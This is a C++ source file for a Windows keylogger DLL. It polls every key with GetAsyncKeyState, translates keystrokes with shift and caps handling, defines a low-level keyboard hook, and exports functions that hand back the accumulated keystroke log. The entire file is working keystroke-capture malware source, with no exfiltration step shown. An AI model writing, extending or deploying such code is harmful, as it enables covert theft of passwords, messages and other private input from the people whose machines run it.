#include "pch.h"
#include "keylogger.hpp"

//global key state flags
bool shiftDown = false;
bool capsToggled = false;
bool numlockToggled = false;

extern "C++" __declspec(dllexport) inline void InitFile() {
	file.open("log.txt");
}

extern "C++" __declspec(dllexport) inline void CloseFile() {
	file.close();
}

void SetGlobalKeyStates()
{
	shiftDown = true*(GetKeyState(VK_SHIFT) >> 15);
	capsToggled = true*(GetKeyState(VK_CAPITAL) & 1);
	numlockToggled = true*(GetKeyState(VK_NUMLOCK) & 1);
	/*if (GetKeyState(VK_SHIFT) >> 15) shiftDown = true;
	else shiftDown = false;
	if (GetKeyState(VK_CAPITAL) & 1) capsToggled = true;
	else capsToggled = false;
	if (GetKeyState(VK_NUMLOCK) & 1) numlockToggled = true;
	else numlockToggled = false;*/
}

void PrintSpecialKeys(const int& key, const bool& shiftState)
{
	switch (key)
	{
	case VK_SPACE:
		LogKeys(" ");
		break;
	case VK_RETURN:
		LogKeys("\n");
		break;
	case VK_OEM_PERIOD:
		if (shiftState) LogKeys(">");
		else LogKeys(".");
		break;
	case VK_OEM_COMMA:
		if (shiftState) LogKeys("<");
		else LogKeys(",");
		break;
	case VK_SHIFT:
		LogKeys("[SHIFT]");
		break;
	case VK_CONTROL:
		LogKeys("[CONTROL]");
		break;
	case VK_BACK:
		logStr.pop_back();
		break;
	case VK_CAPITAL:
		LogKeys("[CAPS]");
		break;
	case VK_F1:
		LogKeys("[F1]");
		break;
	case VK_F2:
		LogKeys("[F2]");
		break;
	case VK_F3:
		LogKeys("[F3]");
		break;
	case VK_F4:
		LogKeys("[F4]");
		break;
	case VK_F5:
		LogKeys("[F5]");
		break;
	case VK_F6:
		LogKeys("[F6]");
		break;
	case VK_F7:
		LogKeys("[F7]");
		break;
	case VK_F8:
		LogKeys("[F8]");
		break;
	case VK_F9:
		LogKeys("[F9]");
		break;
	case VK_F10:
		LogKeys("[F10]");
		break;
	case VK_F11:
		LogKeys("[F11]");
		break;
	case VK_F12:
		LogKeys("[F12]");
		break;
	case VK_NUMPAD0:
		LogKeys("[NUMPAD0]");
		break;
	case VK_NUMPAD1:
		LogKeys("[NUMPAD1]");
		break;
	case VK_NUMPAD2:
		LogKeys("[NUMPAD2]");
		break;
	case VK_NUMPAD3:
		LogKeys("[NUMPAD3]");
		break;
	case VK_NUMPAD4:
		LogKeys("[NUMPAD4]");
		break;
	case VK_NUMPAD5:
		LogKeys("[NUMPAD5]");
		break;
	case VK_NUMPAD6:
		LogKeys("[NUMPAD6]");
		break;
	case VK_NUMPAD7:
		LogKeys("[NUMPAD7]");
		break;
	case VK_NUMPAD8:
		LogKeys("[NUMPAD8]");
		break;
	case VK_NUMPAD9:
		LogKeys("[NUMPAD9]");
		break;
	case VK_TAB:
		LogKeys("[TAB]");
		break;
	case VK_UP:
		LogKeys("[UP]");
		break;
	case VK_DOWN:
		LogKeys("[DOWN]");
		break;
	case VK_LEFT:
		LogKeys("[LEFT]");
		break;
	case VK_RIGHT:
		LogKeys("[RIGHT]");
		break;
	case VK_MENU:
		LogKeys("[ALT]");
		break;
	case VK_OEM_MINUS:
		if (shiftState) LogKeys("_");
		else LogKeys("-");
		break;
	case VK_OEM_PLUS:
		if (shiftState) LogKeys("+");
		else LogKeys("=");
		break;
	case VK_OEM_1:
		if (shiftState) LogKeys(":");
		else LogKeys(";");
		break;
	case VK_OEM_2:
		if (shiftState) LogKeys("?");
		else LogKeys("/");
		return;
	case VK_OEM_3:
		if (shiftState) LogKeys("~");
		else LogKeys("`");
		break;
	case VK_OEM_4:
		if (shiftState) LogKeys("{");
		else LogKeys("[");
		break;
	case VK_OEM_5:
		if (shiftState) LogKeys("|");
		else LogKeys("\\");
		break;
	case VK_OEM_6:
		if (shiftState) LogKeys("}");
		else LogKeys("]");
		break;
	case VK_OEM_7:
		if (shiftState) putchar('"');
		else LogKeys("'");
		break;
	case VK_SNAPSHOT:
		LogKeys("[PRNTSCR]");
		return;
	case VK_INSERT:
		LogKeys("[TOGGLE INSERT]");
		return;
	case VK_HOME:
		LogKeys("[HOME]");
		return;
	case VK_PRIOR:
		LogKeys("[PGUP]");
		return;
	case VK_NEXT:
		LogKeys("[PGDOWN]");
		return;
	case VK_DELETE:
		LogKeys("[DELETE]");
		return;
	case VK_END:
		LogKeys("[END]");
		return;
	case VK_DIVIDE:
		LogKeys("/");
		return;
	case VK_MULTIPLY:
		LogKeys("*");
		return;
	case VK_ADD:
		LogKeys("+");
		return;
	case VK_SUBTRACT:
		LogKeys("-");
		return;
	case VK_LWIN:
		LogKeys("[LWIN]");
		return;
	case VK_RWIN:
		LogKeys("[RWIN]");
		return;
	case VK_SCROLL:
		LogKeys("[TOGGLE SCRLK]");
		return;
	case VK_ESCAPE:
		LogKeys("[ESC]");
		return;
	case VK_DECIMAL:
		LogKeys(".");
		return;
	default:
		return;
	}
}

void PrintDigits(const int& key, const bool& shiftState)
{
	if (shiftState)
	{
		switch (key)
		{
		case 48:
			LogKeys("!");
			return;
		case 49:
			LogKeys("@");
			return;
		case 50:
			LogKeys("#");
			return;
		case 51:
			LogKeys("$");
			return;
		case 52:
			LogKeys("%%");
			return;
		case 53:
			LogKeys("^");
			return;
	case 54:
			LogKeys("&");
			return;
		case 55:
			LogKeys("*");
			return;
		case 56:
			LogKeys("(");
			return;
		case 57:
			LogKeys(")");
			return;
		default:
			return;
		}
	}
	LogDigit(key - 48);
}

void PrintAlpha(const int& key, const bool&& upper)
{
	const int offset = 32 * !upper;
	LogKeys(key + offset);
}

inline void LogKeys(const std::string_view&& str)
{
	logStr += str;
	sizeOfLogStr++;
	//printf("%s", str.data());
}

inline void LogKeys(const int&& key)
{
	logStr += static_cast<char>(key);
	sizeOfLogStr++;
	//printf("%c", key);
}

inline void LogDigit(const int&& digit)
{
	logStr  += std::to_string(digit);
	sizeOfLogStr++;
	//printf("%i", digit);
}

extern "C++" __declspec(dllexport) void StartLog()
{
	//main listening loop
	while (true)
	{
		SetGlobalKeyStates();
		for (int i = 8; i <= 0xDE; ++i)
		{
			if (GetAsyncKeyState(i) & 1)
			{
				if (i >= 'A' && i <= 'Z')
				{
					PrintAlpha(i, shiftDown ^ capsToggled);
				}
				else if (isdigit(i))
				{
					PrintDigits(i, shiftDown);
				}
				else
				{
					PrintSpecialKeys(i, shiftDown);
				}
			}
		}
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(20ms);
	}
}

extern "C" LOGLIB_API LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	const auto key = (LPKBDLLHOOKSTRUCT)lParam;
	logStr += key->vkCode;
	/*if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) 
	{
		if (key->vkCode >= 'A' && key->vkCode <= 'Z')
		{
			PrintAlpha(key->vkCode, shiftDown ^ capsToggled);
		}
		else if (isdigit(key->vkCode))
		{
			PrintDigits(key->vkCode, shiftDown);
		}
		else
		{
			PrintSpecialKeys(key->vkCode, shiftDown);
		}
	}*/
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

extern "C++" __declspec(dllexport) inline std::string GetLog() {
	return logStr;
}

extern "C++" __declspec(dllexport) inline void ClearLogStr() {
	logStr.clear();
}

extern "C++" __declspec(dllexport) inline int GetSizeOfLogStr() {
	return sizeOfLogStr;
}